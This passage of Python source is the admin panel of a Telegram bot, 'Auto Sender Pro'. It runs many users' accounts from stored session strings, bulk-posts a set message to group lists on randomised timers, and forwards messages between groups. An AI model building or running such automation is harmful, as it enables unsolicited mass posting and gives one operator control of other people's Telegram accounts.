        "╔═══════════════════════════════╗\n"
        "║  📡 AUTO SENDER PRO · ADMIN  ║\n"
        "║  Multi-User · Plugin System  ║\n"
        "╚═══════════════════════════════╝\n"
        "```\n"
        f"👥 *Users*    : `{total}`\n"
        f"🟢 *Running*  : `{run}`\n"
        f"📤 *Sent*     : `{sent}`\n\n"
        f"🌐 [Main Portal]({web}) · [Register]({web}/register)\n"
        f"⚙️ Edit `config.json` → `/reload` to apply"
    )

async def start_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    await update.message.reply_text(
        home_text(), parse_mode="Markdown",
        reply_markup=main_kb(), disable_web_page_preview=True,
    )

async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if q.from_user.id != OWNER_ID:
        return
    d = q.data

    if d == "cb_home":
        await q.message.edit_text(home_text(), parse_mode="Markdown",
            reply_markup=main_kb(), disable_web_page_preview=True)

    elif d == "cb_reload":
        global CFG
        CFG = load_config()
        await q.message.reply_text("✅ *Config reloaded!*\nSettings from `config.json` applied.", parse_mode="Markdown")

    elif d == "cb_share":
        web = RENDER_URL or f"http://localhost:{PORT}"
        await q.message.reply_text(
            f"🔗 *Share this link with users:*\n\n`{web}/register`\n\n"
            f"Users will create their own session and you'll get notified!",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🌐 Open Register Page", url=f"{web}/register")
            ]])
        )

    elif d == "cb_status":
        lines = ["📊 *ALL USERS*\n" + "═"*24]
        for slug, u in db["users"].items():
            ico = "🟢" if u.get("running") else "🔴"
            lines.append(
                f"{ico} *{u['name']}*\n"
                f"   📤 {u['stats']['sent']} | ❌ {u['stats']['failed']} | 👥 {len(u['groups'])} grp"
            )
        if not db["users"]: lines.append("_No users yet_")
        await q.message.reply_text("\n\n".join(lines), parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔁 Refresh", callback_data="cb_status"),
                InlineKeyboardButton("🏠 Home",    callback_data="cb_home"),
            ]]))

    elif d == "cb_users":
        if not db["users"]:
            await q.message.reply_text("👥 No users yet. Share the register link!"); return
        btns = []
        for slug, u in db["users"].items():
            ico = "🟢" if u.get("running") else "🔴"
            btns.append([InlineKeyboardButton(
                f"{ico} {u['name']} · {u['stats']['sent']} sent",
                callback_data=f"cb_u_{slug}"
            )])
        btns.append([InlineKeyboardButton("🏠 Home", callback_data="cb_home")])
        await q.message.reply_text("👥 *Select a user to manage:*", parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(btns))

    elif d.startswith("cb_u_"):
        slug = d[5:]
        u = db["users"].get(slug)
        if not u: await q.message.reply_text("❌ Not found."); return
        run  = "🟢 Running" if u.get("running") else "🔴 Stopped"
        prev = (u["message"][:50]+"…") if len(u["message"])>50 else u["message"]
        await q.message.reply_text(
            f"👤 *{u['name']}* (`{slug}`)\n"
            f"📱 `{u.get('phone','?')}`\n"
            f"⚙️ {run}\n"
            f"👥 Groups: `{len(u['groups'])}`\n"
            f"📤 Sent: `{u['stats']['sent']}`  ❌ `{u['stats']['failed']}`\n"
            f"⏱ Delay: `{u.get('min_delay',45)}–{u.get('max_delay',120)}s`\n"
            f"💬 `{prev or 'No message'}`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("▶️ Start",      callback_data=f"cb_us_{slug}"),
                 InlineKeyboardButton("⏹ Stop",        callback_data=f"cb_ux_{slug}")],
                [InlineKeyboardButton("👥 Groups",     callback_data=f"cb_ug_{slug}"),
                 InlineKeyboardButton("✉️ Message",    callback_data=f"cb_um_{slug}")],
                [InlineKeyboardButton("⏱ Set Timing",  callback_data=f"cb_ut_{slug}"),
                 InlineKeyboardButton("🔀 Forwarder",  callback_data=f"cb_uf_{slug}")],
                [InlineKeyboardButton("🗑 Delete",      callback_data=f"cb_ud_{slug}"),
                 InlineKeyboardButton("◀️ Back",        callback_data="cb_users")],
            ])
        )

    elif d.startswith("cb_us_"):  # start user
        slug = d[6:]
        u    = db["users"].get(slug)
        if not u: await q.message.reply_text("❌ Not found."); return
        if not u["groups"]: await q.message.reply_text(f"❌ No groups for {u['name']}."); return
        if not u["message"]: await q.message.reply_text(f"❌ No message for {u['name']}."); return
        if u.get("running"): await q.message.reply_text("⚠️ Already running!"); return
        c = active_clients.get(slug)
        if not c:
            try:
                c = TelegramClient(StringSession(u["session"]), API_ID, API_HASH)
                await c.connect()
                if not await c.is_user_authorized():
                    await q.message.reply_text(f"❌ Session expired for {u['name']}. Re-login needed."); return
                active_clients[slug] = c
            except Exception as e:
                await q.message.reply_text(f"❌ `{e}`", parse_mode="Markdown"); return
        u["running"] = True
        u["stats"]   = {"sent":0,"failed":0,"cycles":0}
        save_db()
        active_tasks[slug] = asyncio.create_task(sending_loop(slug))
        # Start forwarder if rules exist
        if u.get("forward_rules") and cfg("plugins.response_forwarder", False):
            forward_tasks[slug] = asyncio.create_task(
                start_response_forwarder(slug, c, u["forward_rules"])
            )
        await q.message.reply_text(
            f"🚀 *Started {u['name']}!*\n"
            f"👥 `{len(u['groups'])}` groups · ⏱ `{u.get('min_delay',45)}–{u.get('max_delay',120)}s`",
            parse_mode="Markdown"
        )

    elif d.startswith("cb_ux_"):  # stop user
        slug = d[6:]
        u    = db["users"].get(slug)
        if not u: await q.message.reply_text("❌ Not found."); return
        u["running"] = False
        for tasks in [active_tasks, forward_tasks]:
            t = tasks.get(slug)
            if t and not t.done(): t.cancel()
        save_db()
        await q.message.reply_text(
            f"⏹ *Stopped {u['name']}.*\n📤 `{u['stats']['sent']}` sent  ❌ `{u['stats']['failed']}` failed",
            parse_mode="Markdown"
        )

    elif d.startswith("cb_ug_"):  # set groups
        slug = d[6:]
        owner_state["aw"] = "groups"
        owner_state["slug"] = slug
        await q.message.reply_text(
            f"👥 *Set groups for {db['users'][slug]['name']}*\n\nOne per line:\n`@group1\n@group2\nhttps://t.me/grp3`",
            parse_mode="Markdown"
        )

    elif d.startswith("cb_um_"):  # set message
        slug = d[6:]
        owner_state["aw"] = "message"
        owner_state["slug"] = slug
        await q.message.reply_text(
            f"✉️ *Set message for {db['users'][slug]['name']}:*\nSend the message now.",
            parse_mode="Markdown"
        )

    elif d.startswith("cb_ut_"):  # set timing
        slug = d[6:]
        owner_state["aw"] = "timing"
        owner_state["slug"] = slug
        await q.message.reply_text(
            f"⏱ *Set timing for {db['users'][slug]['name']}:*\n\n"
            f"Send in format:\n`min_delay max_delay cycle_min cycle_max`\n\n"
            f"Example: `30 90 60 120`\n"
            f"_(30-90s between groups, 60-120 min cycle)_",
            parse_mode="Markdown"
        )

    elif d.startswith("cb_uf_"):  # set forwarder
        slug = d[6:]
        owner_state["aw"] = "forwarder"
        owner_state["slug"] = slug
        await q.message.reply_text(
            f"🔀 *Response Forwarder for {db['users'][slug]['name']}*\n\n"
            f"Send source→destination pairs, one per line:\n\n"
            f"`@source_group→@dest_group`\n`@grp1→@grp2`\n\n"
            f"Messages from source will be forwarded to dest.\n"
            f"Telegram links will be auto-opened!",
            parse_mode="Markdown"
        )

    elif d.startswith("cb_ud_"):  # delete user
        slug = d[6:]
        u    = db["users"].pop(slug, None)
        if u:
            for tasks in [active_tasks, forward_tasks]:
                t = tasks.get(slug)
                if t and not t.done(): t.cancel()
            c = active_clients.pop(slug, None)
            if c:
                try: await c.disconnect()
                except: pass
            save_db()
            await q.message.reply_text(f"🗑 *{u['name']}* deleted.", parse_mode="Markdown")
        else:
            await q.message.reply_text("❌ Not found.")

    elif d == "cb_start_all":
        started = 0
        for slug, u in db["users"].items():
            if u.get("running") or not u["groups"] or not u["message"]: continue
            c = active_clients.get(slug)
            if not c:
                try:
                    c = TelegramClient(StringSession(u["session"]), API_ID, API_HASH)
                    await c.connect()
                    if await c.is_user_authorized():
                        active_clients[slug] = c
                    else: continue
                except: continue
            u["running"] = True
            u["stats"]   = {"sent":0,"failed":0,"cycles":0}
            active_tasks[slug] = asyncio.create_task(sending_loop(slug))
            if u.get("forward_rules") and cfg("plugins.response_forwarder", False):
                forward_tasks[slug] = asyncio.create_task(
                    start_response_forwarder(slug, c, u["forward_rules"])
                )
            started += 1
        save_db()
        await q.message.reply_text(f"🚀 *Started `{started}` user(s)!*", parse_mode="Markdown")

    elif d == "cb_stop_all":
        stopped = 0
        for slug, u in db["users"].items():
            if u.get("running"):
                u["running"] = False
                for tasks in [active_tasks, forward_tasks]:
                    t = tasks.get(slug)
                    if t and not t.done(): t.cancel()
                stopped += 1
        save_db()
        await q.message.reply_text(f"⏹ *Stopped `{stopped}` user(s).*", parse_mode="Markdown")

async def handle_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    text = update.message.text.strip()
    aw   = owner_state.get("aw")
    slug = owner_state.get("slug")

    if aw == "groups" and slug and slug in db["users"]:
        owner_state["aw"] = None
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        db["users"][slug]["groups"] = lines
        save_db()
        await update.message.reply_text(
            f"✅ `{len(lines)}` groups saved for *{db['users'][slug]['name']}*",
            parse_mode="Markdown"
        )

    elif aw == "message" and slug and slug in db["users"]:
        owner_state["aw"] = None
        db["users"][slug]["message"] = text
        save_db()
        await update.message.reply_text(
            f"✅ Message saved for *{db['users'][slug]['name']}*",
            parse_mode="Markdown"
        )

    elif aw == "timing" and slug and slug in db["users"]:
        owner_state["aw"] = None
        parts = text.split()
        if len(parts) == 4:
            try:
                db["users"][slug]["min_delay"]  = int(parts[0])
                db["users"][slug]["max_delay"]  = int(parts[1])
                db["users"][slug]["cycle_min"]  = int(parts[2])
                db["users"][slug]["cycle_max"]  = int(parts[3])
                save_db()
                await update.message.reply_text(
                    f"✅ Timing updated for *{db['users'][slug]['name']}*\n"
                    f"⏱ `{parts[0]}–{parts[1]}s` delay · `{parts[2]}–{parts[3]}` min cycle",
                    parse_mode="Markdown"
                )
            except:
                await update.message.reply_text("❌ Invalid format. Use: `30 90 60 120`", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Send 4 numbers: `min_delay max_delay cycle_min cycle_max`", parse_mode="Markdown")

    elif aw == "forwarder" and slug and slug in db["users"]:
        owner_state["aw"] = None
        rules = []
        for line in text.splitlines():
            if "→" in line:
                parts = line.split("→")
                if len(parts) == 2:
                    rules.append({
                        "source": parts[0].strip(),
                        "destination": parts[1].strip()
                    })
        db["users"][slug]["forward_rules"] = rules
        save_db()
        await update.message.reply_text(
            f"✅ `{len(rules)}` forwarder rule(s) saved for *{db['users'][slug]['name']}*\n\n"
            + "\n".join(f"• `{r['source']}` → `{r['destination']}`" for r in rules),
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "Use /start to open panel.",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Open Panel", callback_data="cb_home")
            ]])
        )

# ═══════════════════════════════════════════════════════
#               RESTORE + MAIN
# ═══════════════════════════════════════════════════════
async def restore_sessions():
    for slug, u in db["users"].items():
        if not u.get("session"): continue
        try:
            c = TelegramClient(StringSession(u["session"]), API_ID, API_HASH)
            await c.connect()
            if await c.is_user_authorized():
                active_clients[slug] = c
                console.print(f"[green]✅ Restored: {u['name']}[/green]")
                if u.get("running") and u["groups"] and u["message"]:
                    active_tasks[slug] = asyncio.create_task(sending_loop(slug))
                    console.print(f"[cyan]▶️  Resumed: {u['name']}[/cyan]")
                    if u.get("forward_rules") and cfg("plugins.response_forwarder", False):
                        forward_tasks[slug] = asyncio.create_task(
                            start_response_forwarder(slug, c, u["forward_rules"])
                        )
            else:
                console.print(f"[yellow]⚠️  Expired: {u['name']}[/yellow]")
                u["running"] = False
        except Exception as e:
            console.print(f"[red]❌ {u['name']}: {e}[/red]")

def print_banner():
    console.print(Panel.fit(
        "[bold cyan]📡 AUTO SENDER PRO — Plugin Edition[/bold cyan]\n"
        "[dim]Multi-User · Forwarder · Config Hot-Reload · Anti-Sleep[/dim]",
        border_style="bright_cyan", padding=(1,6),
    ))
    web = RENDER_URL or f"http://localhost:{PORT}"
    t = Table(box=box.ROUNDED, border_style="dim cyan", show_header=False, padding=(0,2))
    t.add_column("", style="bold yellow", no_wrap=True)
    t.add_column("", style="white")
    t.add_row("Web",      web)
    t.add_row("Register", web+"/register")
    t.add_row("Config",   CONFIG_FILE + "  (edit anytime)")
    t.add_row("Reload",   web+"/reload  or  bot cb_reload")
    t.add_row("Owner ID", str(OWNER_ID) if OWNER_ID else "⚠️ Set OWNER_ID")
    console.print(t)
    console.print()

async def run_all():
    global _bot_app
    load_db()
    if not BOT_TOKEN:
        console.print("[red]❌ BOT_TOKEN not set![/red]"); sys.exit(1)
    if OWNER_ID == 0:
        console.print("[red]❌ OWNER_ID not set![/red]"); sys.exit(1)

    await restore_sessions()
    save_db()

    bot_app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .concurrent_updates(False)
        .updater(None)
        .build()
    )
    _bot_app = bot_app
    bot_app.add_handler(CommandHandler("start", start_cmd))
    bot_app.add_handler(CallbackQueryHandler(button_handler))
    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    await bot_app.initialize()
    await bot_app.start()

    web_app = build_web_app()
    runner  = web.AppRunner(web_app)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", PORT).start()
    console.print(f"[cyan]🌐 Port {PORT} ready[/cyan]")

    if RENDER_URL:
        wh = f"{RENDER_URL}/{BOT_TOKEN}"
        await bot_app.bot.set_webhook(url=wh, drop_pending_updates=True)
        console.print(f"[cyan]🔗 Webhook: {wh}[/cyan]")
    else:
        await bot_app.bot.delete_webhook(drop_pending_updates=True)
        await bot_app.updater.start_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)

    asyncio.create_task(keep_alive_loop())
    console.print("[bold green]✅ All systems go![/bold green]")

    try:
        await asyncio.Event().wait()
    finally:
        for u in db["users"].values(): u["running"] = False
        save_db()
        await bot_app.stop()
        await bot_app.shutdown()
        await runner.cleanup()

def main():
    print_banner()
    asyncio.run(run_all())

if __name__ == "__main__":
    main()
